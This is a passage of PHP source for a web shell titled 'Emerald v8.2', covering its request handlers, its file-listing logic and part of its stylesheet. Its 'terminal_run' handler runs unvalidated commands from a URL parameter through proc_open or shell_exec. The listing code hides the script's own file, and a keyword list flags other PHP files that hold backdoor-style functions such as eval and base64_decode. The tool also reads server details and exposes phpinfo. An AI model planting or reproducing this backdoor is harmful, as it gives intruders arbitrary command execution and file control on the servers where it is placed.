                    $formatted_size = format_size($total_size);
                    $_SESSION['folder_size_cache'][$path] = ['size' => $formatted_size, 'time' => time()];
                    send_json_response(['status' => 'success', 'size' => $formatted_size]);
                } catch(Exception $e) {
                    send_json_response(['status' => 'error', 'message' => 'Could not access all files.']);
                }
            } else {
                send_json_response(['status' => 'error', 'message' => 'Path is not a valid directory.']);
            }
            exit;
        case 'grep': $query = $_GET['query'] ?? ''; $pattern = $_GET['pattern'] ?? '*'; $results = []; if (!empty($query)) { $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS)); foreach ($iterator as $file) { if ($file->isFile() && @is_readable($file->getRealPath()) && fnmatch($pattern, $file->getFilename())) { $content = @file_get_contents($file->getRealPath()); if ($content !== false && stripos($content, $query) !== false) { $results[] = ['path' => $file->getRealPath(), 'filename' => basename($file->getRealPath())]; } } } } send_json_response(['status' => 'success', 'results' => $results]); exit;
        case 'recursive_content_search': // [NEW FEATURE v8.1] Recursive Content Search
            $query = $_GET['query'] ?? '';
            $results = [];
            if (!empty($query)) {
                $raw_results = recursive_content_search($dir, $query);
                foreach ($raw_results as $item) {
                    $type_info = get_file_type_and_ext($item['path']);
                     $results[] = [
                         'path' => $item['path'],
                         'name' => basename($item['path']),
                         'is_dir' => false,
                         'type' => $type_info['type'],
                         'ext' => $type_info['ext']
                     ];
                }
            }
            send_json_response(['status' => 'success', 'results' => $results]);
            exit;
        case 'recursive_search':
            $query = $_GET['query'] ?? '';
            $results = [];
            if (!empty($query)) {
                $iterator = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::SELF_FIRST
                );
                foreach ($iterator as $item) {
                    if (stripos($item->getFilename(), $query) !== false) {
                        $path = $item->getRealPath();
                        $type_info = get_file_type_and_ext($path);
                         $results[] = [
                             'path' => $path,
                             'name' => basename($path),
                             'is_dir' => $item->isDir(),
                             'type' => $type_info['type'],
                             'ext' => $type_info['ext']
                         ];
                    }
                }
            }
            send_json_response(['status' => 'success', 'results' => $results]);
            exit;
        case 'terminal_run':
            header('Content-Type: text/plain; charset=utf-8');
            $cmd = $_GET['cmd'];
            $full_cmd = 'cd ' . escapeshellarg($dir) . ' && ' . $cmd;

            if (function_exists('proc_open')) {
                $descriptorspec = [ 0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"] ];
                $process = @proc_open($full_cmd, $descriptorspec, $pipes);
                if (is_resource($process)) {
                    fclose($pipes[0]);
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    $error = stream_get_contents($pipes[2]);
                    fclose($pipes[2]);
                    proc_close($process);
                    echo $output . $error;
                    exit;
                }
            }
            
            $df = @ini_get('disable_functions');
            $is_shell_exec_disabled = $df ? in_array('shell_exec', array_map('trim', explode(',', $df))) : false;
            if (function_exists('shell_exec') && !$is_shell_exec_disabled) {
                echo shell_exec($full_cmd . ' 2>&1');
                exit;
            }

            echo "Terminal function is disabled on this server (proc_open and shell_exec).";
            exit;
        case 'get_server_stats':
            $cpu_load = 0; $mem_total = 0; $mem_free = 0; $mem_used = 0;
            if (is_readable("/proc/stat") && is_readable("/proc/meminfo")) {
                // Get CPU Load
                $stat1 = file('/proc/stat');
                sleep(1);
                $stat2 = file('/proc/stat');
                $info1 = explode(" ", preg_replace("! +!", " ", $stat1[0]));
                $info2 = explode(" ", preg_replace("! +!", " ", $stat2[0]));
                $dif = [];
                $dif['user'] = $info2[1] - $info1[1];
                $dif['nice'] = $info2[2] - $info1[2];
                $dif['sys'] = $info2[3] - $info1[3];
                $dif['idle'] = $info2[4] - $info1[4];
                $total = array_sum($dif);
                if ($total > 0) {
                    $cpu_load = (100 - ($dif['idle'] / $total) * 100);
                }

                // Get Memory Usage
                $meminfo = file_get_contents("/proc/meminfo");
                preg_match("/MemTotal\:\s+(\d+)/", $meminfo, $mem_total_matches);
                $mem_total = $mem_total_matches[1] ?? 0;
                preg_match("/MemFree\:\s+(\d+)/", $meminfo, $mem_free_matches);
                $mem_free = $mem_free_matches[1] ?? 0;
                preg_match("/Buffers\:\s+(\d+)/", $meminfo, $buffers_matches);
                $buffers = $buffers_matches[1] ?? 0;
                preg_match("/Cached\:\s+(\d+)/", $meminfo, $cached_matches);
                $cached = $cached_matches[1] ?? 0;
                $mem_used = $mem_total - $mem_free - $buffers - $cached;
            }
            send_json_response([
                'cpu' => round($cpu_load, 2),
                'mem_used' => round($mem_used / 1024, 2), // MB
                'mem_total' => round($mem_total / 1024, 2) // MB
            ]);
            break;
        case 'phpinfo': phpinfo(); exit;
        case 'clear_clipboard': unset($_SESSION['clipboard']); header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir)); exit;
    }
}


// --- Data Collection for View ---
$dir = SCRIPT_DIR;
if (isset($_GET['dir'])) {
    $requested_path = $_GET['dir'];
    $resolved_path = realpath($requested_path);
    if ($resolved_path !== false && is_dir($resolved_path)) {
        $dir = $resolved_path;
    } else {
        $_SESSION['flash_message'] = create_message('Error: Invalid or inaccessible path.', 'error');
        header('Location: ?dir=' . urlencode(SCRIPT_DIR));
        exit;
    }
}

// [NEW v8.0] Define the list of dangerous keywords to check for
$danger_keywords = [
    'eval', 'assert', 'system', 'exec', 'passthru', 'popen', 'proc_open',
    'pcntl_exec', 'preg_replace', 'create_function', 'file_put_contents',
    'file_get_contents', 'fopen', 'fwrite', 'move_uploaded_file', 'chmod',
    'delete', 'rename', 'scandir', 'copy', 'phpinfo', 'uname', 'getcwd', 'getenv',
    'base64_decode', 'gzuncompress', 'gzinflate', 'gzdecode', 'str_rot13', 'strrev',
    'chr', 'ord'
];


$items = [];
$scan = @scandir($dir);
if ($scan) {
    foreach ($scan as $item) {
        if ($item == '.') continue;
        // Exclude self from file list
        if ($item == SCRIPT_FILENAME && realpath($dir . DIRECTORY_SEPARATOR . $item) == __FILE__) continue;

        $path = $dir . DIRECTORY_SEPARATOR . $item;
        $is_dir = is_dir($path);
        $owner_id = @fileowner($path);
        $group_id = @filegroup($path);
        $owner_name = (function_exists('posix_getpwuid') && $owner_id !== false) ? posix_getpwuid($owner_id)['name'] : $owner_id;
        $group_name = (function_exists('posix_getgrgid') && $group_id !== false) ? posix_getgrgid($group_id)['name'] : $group_id;
        $is_bookmarked = $is_dir && in_array($path, $_SESSION['bookmarks'] ?? []);
        $type_info = get_file_type_and_ext($path);

        // [MODIFIED v8.1] Check for dangerous functions only on PHP files
        $contains_danger_keyword = false;
        $is_php_file = (!$is_dir && $type_info['ext'] === 'php'); // Only target PHP files
        if ($is_php_file && is_readable($path)) {
            $content = @file_get_contents($path);
            if ($content !== false) {
                foreach ($danger_keywords as $keyword) {
                    // Use stripos for case-insensitive search and check for word boundaries or common syntax
                    if (preg_match('/\b' . preg_quote($keyword) . '\b\s*\(?/i', $content)) {
                        $contains_danger_keyword = true;
                        break;
                    }
                }
            }
        }

        $items[] = [
            'name' => $item,
            'path' => $path,
            'is_dir' => $is_dir,
            'size' => $is_dir ? -1 : @filesize($path),
            'mtime' => @filemtime($path),
            'perms' => get_perms_octal($path),
            'owner' => $owner_name,
            'group' => $group_name,
            'type' => $type_info['type'],
            'ext' => $type_info['ext'],
            'is_bookmarked' => $is_bookmarked,
            'contains_danger_keyword' => $contains_danger_keyword // [NEW v8.0] Add flag to item data
        ];
    }
}

$total_space = @disk_total_space(SCRIPT_DIR); $free_space = @disk_free_space(SCRIPT_DIR); $used_space = $total_space > 0 ? $total_space - $free_space : 0;
$current_user = function_exists('get_current_user') ? get_current_user() : 'user';

$terminal_enabled = function_exists('proc_open') || (function_exists('shell_exec') && !in_array('shell_exec', array_map('trim', explode(',', @ini_get('disable_functions')))));

$server_info = [
    'os' => PHP_OS,
    'software' => strtok($_SERVER['SERVER_SOFTWARE'], ' '),
    'php_version' => PHP_VERSION,
    'zip_enabled' => class_exists('ZipArchive'),
    'terminal_enabled' => $terminal_enabled,
    'disk_percent' => $total_space > 0 ? ($used_space / $total_space) * 100 : 0,
    'user' => $current_user,
    'server_ip' => $_SERVER['SERVER_ADDR'] ?? '127.0.0.1'
];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Emerald v8.2</title>
    <link rel="icon" href="https://i.postimg.cc/90F3Y2YH/ptsmc.png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/material-darker.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/dracula.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/cobalt.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/eclipse.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/dialog/dialog.min.css">
    <style>
        :root {
            --font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            --primary-color: #ff0000; --accent-color: #b300fe; --danger-color: #e74c3c; --success-color: #2ecc71; --warning-color: #f1c40f;
            --sidebar-bg: rgba(20, 22, 28, 0.8); --main-bg: #0d1117; --text-primary: #E9ECEF; --text-secondary: #8A92A6;
            --card-bg: rgba(20, 22, 28, 0.9); --border-color: #3A3F44; --shadow: 0 4px 20px -8px rgba(0,0,0,0.4);
            --border-radius-sm: 8px; --border-radius-md: 12px;
            --primary-glow: 0 0 15px rgba(255,0,0,0.5);
            --accent-glow: 0 0 15px rgba(179,0,254,0.5);
            /* [NEW v8.0] Icon Colors */
            --icon-color-dir: #5DADE2;
            --icon-color-image: #58D68D;
            --icon-color-archive: #F5B041;
            --icon-color-code: #A569BD;
            --icon-color-file: #AAB7B8;
        }
        .light-mode {
            --sidebar-bg: rgba(255, 255, 255, 0.8); --main-bg: #F8F9FB; --text-primary: #111;
            --text-secondary: #718096; --card-bg: rgba(255, 255, 255, 0.95); --border-color: #DEE2E6; --shadow: 0 4px 20px -8px rgba(0,0,0,0.1);
            --icon-color-dir: #3498DB;
            --icon-color-image: #2ECC71;
            --icon-color-archive: #F39C12;
            --icon-color-code: #9B59B6;
            --icon-color-file: #7F8C8D;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        @keyframes gradientAnimation { 0% {background-position: 0% 50%;} 50% {background-position: 100% 50%;} 100% {background-position: 0% 50%;} }
        body { font-family: var(--font-family); background-color: var(--main-bg); color: var(--text-primary); font-size: 14px; display: flex; transition: background-color 0.3s, color 0.3s; height: 100vh; overflow: hidden; }
        body.is-dragging { user-select: none; }
        body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; background: linear-gradient(-45deg, rgba(255, 0, 0, 0.05), rgba(179, 0, 254, 0.05), rgba(255, 0, 0, 0.05)); background-size: 400% 400%; animation: gradientAnimation 15s ease infinite; }
        i.feather { width: 1em; height: 1em; stroke-width: 2.5; vertical-align: middle; }
        
        /* --- Sidebar --- */
        .sidebar { width: 280px; background-color: var(--sidebar-bg); border-right: 1px solid var(--border-color); height: 100vh; display: flex; flex-direction: column; padding: 20px; position: fixed; transition: transform 0.3s ease-in-out; backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); z-index: 100; flex-shrink: 0; }
        .sidebar-header h1 { font-size: 44px; font-weight: 700; margin-bottom: 5px; color: var(--primary-color); letter-spacing: 1px;}
        .sidebar-header .subtitle { font-size: 12px; color: var(--text-secondary); margin-bottom: 20px; }
        .sidebar-section h2 { font-size: 12px; font-weight: 600; text-transform: uppercase; color: var(--text-secondary); margin: 20px 0 10px; border-bottom: 1px solid var(--border-color); padding-bottom: 5px; }
        .stat-cards { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
        .stat-card { background: var(--main-bg); border-radius: var(--border-radius-sm); padding: 10px; font-size: 12px; border: 1px solid var(--border-color); }
        .stat-card .label { color: var(--text-secondary); margin-bottom: 4px; display: block; }
        .stat-card .value { font-weight: 600; word-break: break-all; }
        .on { color: #2ecc71; } .off { color: var(--danger-color); }
        .progress-bar { width: 100%; background-color: var(--border-color); border-radius: 5px; height: 8px; overflow: hidden; margin-top: 10px; }
        .progress-bar-inner { height: 100%; background: linear-gradient(90deg, var(--primary-color), var(--accent-color)); border-radius: 5px; transition: width 0.5s; }
        .sidebar-tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(45px, 1fr)); gap: 10px; }
        .action-btn { width: 100%; padding: 10px; margin-bottom: 10px; border-radius: var(--border-radius-sm); border: 1px solid var(--border-color); background-color: transparent; color: var(--text-primary); cursor: pointer; text-align: left; font-size: 14px; font-weight: 500; transition: all 0.2s ease; display: flex; align-items: center; gap: 10px; }
        .action-btn.icon-only { width: 100%; height: 45px; padding: 0; justify-content: center; margin-bottom: 0; }
        .action-btn:hover { background-color: var(--primary-color); color: #fff; border-color: var(--primary-color); box-shadow: var(--primary-glow); transform: translateY(-2px); }
        .action-btn .feather { font-size: 16px; }
        .action-btn.icon-only .feather { font-size: 20px; }
        #bookmarks-list { list-style: none; padding: 0; max-height: 150px; overflow-y: auto; }
        #bookmarks-list li a { color: var(--text-secondary); text-decoration: none; display: block; padding: 8px 0; border-radius: 4px; transition: all 0.2s; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; font-size: 14px; }
        #bookmarks-list li a:hover { color: var(--primary-color); background-color: rgba(0,0,0,0.2); padding-left: 5px; }

        /* --- Main Content --- */
        .main-content { margin-left: 280px; width: calc(100% - 280px); transition: margin-left 0.3s ease-in-out, width 0.3s ease-in-out; display: flex; flex-direction: column; height: 100vh; }
        .main-header { padding: 15px 25px; flex-shrink: 0; border-bottom: 1px solid var(--border-color); background: var(--main-bg); position: sticky; top: 0; z-index: 10; }
        .top-header-row, .bottom-header-row { display: flex; justify-content: space-between; align-items: center; gap: 15px; flex-wrap: wrap; }
        .top-header-row { margin-bottom: 15px; }
        .breadcrumbs-container { flex-grow: 1; background: var(--card-bg); padding: 8px 15px; border-radius: var(--border-radius-md); border: 1px solid var(--border-color); overflow: hidden; min-width: 200px; display: flex; align-items: center; gap: 10px; }
        .breadcrumbs { display: flex; align-items: center; gap: 8px; white-space: nowrap; font-weight: 500; }
        .breadcrumb-item { color: var(--text-secondary); text-decoration: none; display: flex; align-items: center; gap: 8px; }
        .breadcrumb-item a { color: var(--text-primary); text-decoration: none; } .breadcrumb-item a:hover { color: var(--primary-color); }
        .bookmark-toggle { cursor: pointer; color: var(--text-secondary); transition: all 0.2s; }
        .bookmark-toggle:hover { color: var(--warning-color); transform: scale(1.2); }
        .bookmark-toggle.bookmarked { color: var(--warning-color); }
        .server-info { color: var(--primary-color); font-family: monospace; font-size: 14px; background: var(--card-bg); padding: 8px 15px; border-radius: var(--border-radius-md); border: 1px solid var(--border-color); }
        .header-actions { display: flex; align-items: center; gap: 15px; }
        .header-nav-actions { display: flex; align-items: center; gap: 10px; flex-grow: 1; }
        .header-nav-actions .form-group { display: flex; gap: 5px; flex-grow: 1; max-width: 300px; }
        .header-nav-actions input { flex-grow: 1; border: 1px solid var(--border-color); background: var(--main-bg); border-radius: var(--border-radius-sm); padding: 0 12px; color: var(--text-primary); height: 38px; }
        .header-nav-actions input:focus { outline: none; border-color: var(--primary-color); box-shadow: 0 0 0 3px rgba(255,0,0,.2); }
        .header-nav-actions button, .header-nav-actions a { display: flex; align-items: center; justify-content: center; height: 38px; padding: 0 15px; border-radius: var(--border-radius-sm); border: 1px solid var(--border-color); background-color: var(--card-bg); color: var(--text-primary); cursor: pointer; text-decoration:none; font-weight: 500; transition: all 0.2s ease; }
        .header-nav-actions button:hover, .header-nav-actions a:hover { background-color: var(--primary-color); color: #fff; border-color: var(--primary-color); box-shadow: var(--primary-glow); }

        #theme-toggle, .view-toggle button { font-size: 20px; cursor: pointer; user-select: none; line-height: 1; background: none; border: none; color: var(--text-secondary); transition: color 0.2s, transform 0.2s; padding: 5px; }
        .view-toggle button.active, #theme-toggle:hover, .view-toggle button:hover { color: var(--primary-color); transform: scale(1.1); }
        .logout-btn { background-color: rgba(255, 71, 87, 0.1); color: var(--danger-color); padding: 8px 15px; border-radius: var(--border-radius-sm); text-decoration: none; font-weight: 600; transition: all 0.2s; }
        .logout-btn:hover { background-color: var(--danger-color); color: #fff; }
        
        .content-wrapper { flex-grow: 1; overflow-y: auto; padding: 20px 25px; position: relative; }
        .content-wrapper::before { content:''; position: absolute; top:0; left:0; width:100%; height:100%; background-image: radial-gradient(var(--border-color) 1px, transparent 0); background-size: 20px 20px; opacity: 0.2; z-index: -1; }

        .toolbar { display: flex; justify-content: space-between; align-items: center; gap: 10px; margin-bottom: 20px; flex-wrap: wrap;}
        .toolbar .select-all { display: flex; align-items: center; gap: 8px; }
        #search-box { flex-grow: 1; border: 1px solid var(--border-color); background: var(--card-bg); border-radius: var(--border-radius-sm); padding: 10px 15px; color: var(--text-primary); min-width: 150px;}
        .item-count { font-size: 12px; color: var(--text-secondary); white-space: nowrap; }
        .filter-buttons button { background: var(--card-bg); border: 1px solid var(--border-color); color: var(--text-secondary); padding: 8px 12px; border-radius: var(--border-radius-sm); cursor:pointer; transition: all 0.2s; }
        .filter-buttons button.active, .filter-buttons button:hover { background: var(--primary-color); color: #fff; border-color: var(--primary-color); }
        .filter-buttons button .feather { width: 16px; height: 16px; margin-right: 5px; }

        /* --- File List --- */
        @keyframes item-fade-in { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .file-item { animation: item-fade-in 0.3s ease-out forwards; animation-delay: calc(var(--i) * 10ms); opacity: 0; }
        .file-list-container { transition: opacity 0.3s; min-height: 300px; }
        .list-view .file-list-header { display: flex; padding: 8px 15px; margin-bottom: 8px; color: var(--text-secondary); font-weight: 600; text-transform: uppercase; font-size: 11px; user-select: none; }
        .list-view .header-col { cursor: pointer; display: flex; align-items: center; transition: color 0.2s;}
        .list-view .header-col:hover { color: var(--text-primary); }
        .list-view .header-col.sort-asc::after, .list-view .header-col.sort-desc::after { content: ''; margin-left: 5px; border: 4px solid transparent; }
        .list-view .header-col.sort-asc::after { border-bottom-color: var(--text-primary); }
        .list-view .header-col.sort-desc::after { border-top-color: var(--text-primary); }
        .list-view .header-name { flex-grow: 1; margin-left: 54px; }
        .list-view .header-owner, .list-view .header-size { width: 120px; text-align: left; }
        .list-view .header-perms { width: 80px; }
        .list-view .header-date { width: 160px; text-align: left; }
        .list-view .file-item { display: flex; align-items: center; padding: 8px 15px; background-color: var(--card-bg); border-radius: var(--border-radius-md); margin-bottom: 8px; transition: all 0.25s ease; border: 1px solid transparent; }
        .list-view .file-item:hover { transform: translateY(-2px); border-color: var(--primary-color); box-shadow: var(--primary-glow); }
        .list-view .file-checkbox { margin-right: 15px; }
        .list-view .file-icon { margin-right: 15px; display: flex; align-items: center; width: 24px; justify-content: center; }
        .list-view .file-info { flex-grow: 1; display: flex; justify-content: space-between; align-items: center; }
        .list-view .file-name-container { display: flex; align-items: center; gap: 8px; }
        .list-view .file-details { display: flex; color: var(--text-secondary); font-size: 13px; gap: 15px; align-items: center; }
        .list-view .file-owner, .list-view .file-size { width: 120px; text-align: left; font-family: monospace; }
        .list-view .file-perms { width: 80px; font-family: monospace; }
        .list-view .file-date { width: 160px; text-align: left; font-family: monospace; }
        .grid-view { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 20px; }
        .grid-view .file-item { display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; background-color: var(--card-bg); border-radius: var(--border-radius-md); padding: 15px; border: 1px solid transparent; transition: all 0.25s ease; position: relative; cursor: pointer; }
        .grid-view .file-item:hover { transform: translateY(-3px); border-color: var(--primary-color); box-shadow: var(--primary-glow); }
        .grid-view .file-icon .feather { width: 48px; height: 48px; } .grid-view .file-info { width: 100%; margin-top: 10px; display: flex; justify-content: center; align-items: center; gap: 5px; }
        .grid-view .file-checkbox { position: absolute; top: 10px; left: 10px; }
        .file-item.selected { background-color: rgba(255, 0, 0, 0.1); border-color: var(--primary-color); }
        .file-icon .feather { width: 24px; height: 24px; vertical-align: middle; }
        .file-info .name { color: var(--text-primary); font-weight: 500; text-decoration: none; word-break: break-all; }
        .file-info a.name:hover { color: var(--primary-color); text-decoration: underline; }
        .file-checkbox { transform: scale(1.1); accent-color: var(--primary-color); cursor: pointer; }
        .owner-root { color: var(--danger-color); font-weight: bold; }
        
        /* [NEW v8.0] Icon Coloring */
        .file-icon[data-type="dir"] .feather, .file-icon[data-type="dir-up"] .feather { color: var(--icon-color-dir); }
        .file-icon[data-type="image"] .feather { color: var(--icon-color-image); }
        .file-icon[data-type="archive"] .feather { color: var(--icon-color-archive); }
        .file-icon[data-type="code"] .feather { color: var(--icon-color-code); }
        .file-icon[data-type="file"] .feather, .file-icon[data-type="video"] .feather, .file-icon[data-type="audio"] .feather, .file-icon[data-type="pdf"] .feather { color: var(--icon-color-file); }
        
        /* [NEW v8.0] Danger Indicator */
        .danger-indicator { color: var(--warning-color); display: inline-flex; align-items: center; }
        .danger-indicator .feather { width: 14px; height: 14px; }

        /* [NEW v8.0] Empty folder message */
        .empty-folder-message { text-align: center; color: var(--text-secondary); padding: 50px 0; }
        .empty-folder-message i.feather { width: 64px; height: 64px; margin-bottom: 20px; }
        .empty-folder-message p { font-size: 1.2em; }

        /* --- Context Menu & Selection Toolbar --- */
        #context-menu { position: fixed; z-index: 10000; width: 220px; background: var(--sidebar-bg); border-radius: var(--border-radius-sm); padding: 8px; box-shadow: 0 5px 25px rgba(0,0,0,0.3); border: 1px solid var(--border-color); display: none; backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);}
        .context-menu-item { display: flex; align-items: center; padding: 10px 12px; border-radius: 5px; cursor: pointer; color: var(--text-primary); background: none; border: none; width: 100%; text-align: left; font-size: 14px; gap: 10px; transition: all 0.2s; }
        .context-menu-item .feather { font-size: 16px; opacity: 0.7; }
        .context-menu-item:hover { background-color: var(--primary-color); color: #fff; }
        .context-menu-item:hover .feather { opacity: 1; }
        .context-menu-separator { height: 1px; background: var(--border-color); margin: 5px 0; }
        
        #selection-toolbar {
            position: fixed;
            bottom: -120px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 998;
            background: var(--card-bg);
            backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
            border: 1px solid var(--border-color);
            border-radius: var(--border-radius-md);
            padding: 10px 15px;
            display: flex;
            align-items: center;
            gap: 15px;
            box-shadow: 0 -5px 25px rgba(0,0,0,0.3);
            transition: bottom 0.3s ease-in-out;
        }
        #selection-toolbar.visible {
            bottom: 85px;
        }
        #selection-toolbar .selection-info {
            color: var(--text-secondary);
            font-weight: 500;
            white-space: nowrap;
        }
        #selection-toolbar .selection-actions {
            display: flex;
            gap: 8px;
        }
        #selection-toolbar .selection-actions button {
            background: var(--main-bg);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            border-radius: var(--border-radius-sm);
            width: 44px;
            height: 44px;
            font-size: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        #selection-toolbar .selection-actions button:hover:not(:disabled) {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
            color: #fff;
            transform: translateY(-2px);
            box-shadow: var(--primary-glow);
        }
        #selection-toolbar .selection-actions button:disabled {
            opacity: 0.4;
            cursor: not-allowed;
            background-color: var(--main-bg);
            color: var(--text-secondary);
        }
        #selection-toolbar .selection-actions button.danger:hover:not(:disabled) {
             background-color: var(--danger-color);
             border-color: var(--danger-color);
        }
        #selection-total-size { margin-left: 10px; font-size: 12px; color: var(--text-secondary); }

        /* --- Terminal --- */
        #floating-terminal-btn {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 999;
            width: 150px;
            height: 50px;
            background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
            border: none;
            border-radius: 25px;
            color: #fff;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            transition: all 0.3s ease;
            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
        }
        #floating-terminal-btn:hover {
            transform: translateX(-50%) translateY(-3px) scale(1.05);
            box-shadow: 0 0 25px rgba(255,0,0,0.6);
        }
        #floating-terminal-btn .feather { font-size: 20px; }
        #terminalModal .modal-content {
            position: absolute;
            max-width: 1700px;
            width: 90vw;
            height: 800px;
            min-width: 1400px;
            min-height: 200px;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
            overflow: hidden;
            resize: none;
        }
        #terminalModal .modal-header { cursor: move; }
        .resizer-se {
            width: 15px; height: 15px;
            position: absolute; right: 0; bottom: 0;
            cursor: nwse-resize;
        }

        /* --- Modal, Toast & Loader --- */
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } } @keyframes scaleUp { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: none; justify-content: center; align-items: center; z-index: 1000; animation: fadeIn 0.3s; padding: 20px; }
        .modal-content { background: var(--sidebar-bg); padding: 0; border-radius: var(--border-radius-md); width: 100%; max-width: 500px; animation: scaleUp 0.3s; backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); border: 1px solid var(--border-color); display: flex; flex-direction: column; overflow: hidden; max-height: 95vh; }
        .modal-content.modal-lg { max-width: 90vw; }
        .modal-content.modal-xl { max-width: 95vw; }
        .modal-content.modal-fullscreen { width: 100vw; height: 100vh; max-width: none; border-radius: 0; max-height: 100vh; top: 0 !important; left: 0 !important; }
        .modal-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; border-bottom: 1px solid var(--border-color); background: rgba(0,0,0,0.2); flex-shrink: 0; }
        .modal-title { font-size: 23px; font-weight: 600; }
        .modal-header-actions { display: flex; align-items: center; gap: 15px; }
        .modal-header-actions .header-btn { background: none; border: none; color: var(--text-secondary); cursor: pointer; font-size: 18px; padding: 5px; transition: all 0.2s; }
        .modal-header-actions .header-btn:hover { color: var(--text-primary); transform: scale(1.1); }
        .modal-close { cursor: pointer; font-size: 60px; color: var(--text-secondary); background: none; border: none; line-height: 1; padding: 5px; }
        .modal-body { padding: 25px; overflow-y: auto; }
        #editor-container { height: 70vh; border-top: 1px solid var(--border-color); border-bottom: 1px solid var(--border-color); overflow: hidden; font-size: 15px; flex-grow: 1; display: flex; flex-direction: column; }
        .CodeMirror { height: 100%; flex-grow: 1; }
        .CodeMirror-dialog { background-color: var(--sidebar-bg); border: 1px solid var(--border-color); color: var(--text-primary); }
        .CodeMirror-dialog input { background: var(--main-bg); color: var(--text-primary); border: 1px solid var(--border-color); }
        .CodeMirror-dialog button { background: var(--primary-color); color: #fff; border: none; padding: 2px 8px; border-radius: 4px; }
        .modal-actions { padding: 15px 25px; display: flex; justify-content: flex-end; gap: 10px; border-top: 1px solid var(--border-color); background: rgba(0,0,0,0.2); flex-shrink: 0; }
        .modal-actions button, .modal-form input, .modal-form select, .modal-form button, .modal-form textarea { padding: 10px 20px; border-radius: var(--border-radius-sm); border: none; cursor: pointer; font-weight: 600; transition: all 0.2s; }
        .btn-cancel { background-color: var(--border-color); color: var(--text-secondary); }
        .btn-cancel:hover { background-color: #4a4f54; color: var(--text-primary); }
        .btn-save, .btn-submit, .btn-primary { background-color: var(--primary-color); color: #fff; }
        .btn-primary:hover, .btn-submit:hover, .btn-save:hover { filter: brightness(1.2); box-shadow: var(--primary-glow); }
        .btn-danger { background-color: var(--danger-color); color: #fff; }
        .btn-danger:hover { filter: brightness(1.2); }
        .modal-form input[type=text], .modal-form input[type=url], .modal-form input[type=search], .modal-form select, .modal-form textarea { border: 1px solid var(--border-color); background: var(--main-bg); color: var(--text-primary); width: 100%; }
        .modal-form .form-group { display: block; margin-bottom: 15px; } .modal-form label { display: block; margin-bottom: 5px; color: var(--text-secondary); }
        #details-table { width: 100%; border-collapse: collapse; }
        #details-table td { padding: 8px; border-bottom: 1px solid var(--border-color); word-break: break-all; }
        #details-table td:first-child { font-weight: bold; color: var(--text-secondary); width: 100px; }
        #grep-results, #search-results, #content-search-results { max-height: 40vh; overflow-y: auto; background: var(--main-bg); padding: 10px; border-radius: var(--border-radius-sm); margin-top: 15px; border: 1px solid var(--border-color); }
        #grep-results div, #search-results div, #content-search-results div { padding: 5px; border-bottom: 1px solid var(--border-color); display: flex; align-items: center; gap: 10px;}
        #terminal-output { flex-grow: 1; background: #000; color: #00fdff; padding: 10px; overflow-y: auto; font-family: monospace; font-size: 17px; white-space: pre-wrap; word-break: break-all; }
        #terminal-input-container { display: flex; align-items: center; background: #000; width:1800px; border-top: 1px solid var(--border-color); padding: 10px 10px; flex-shrink: 0; }
        #terminal-prompt { font-family: 'Courier New', Courier, monospace; color: var(--text-secondary); white-space: nowrap;}
        #terminal-prompt .user { color: #ff00a3; }
        #terminal-input { flex-grow:1; background:transparent; color:#fff; width:1225px; border:none; padding:5px; font-family: 'Courier New', Courier, monospace; font-size: 17px; }
        #terminal-input:focus { outline: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .terminal-loader-container { padding: 5px 0; }
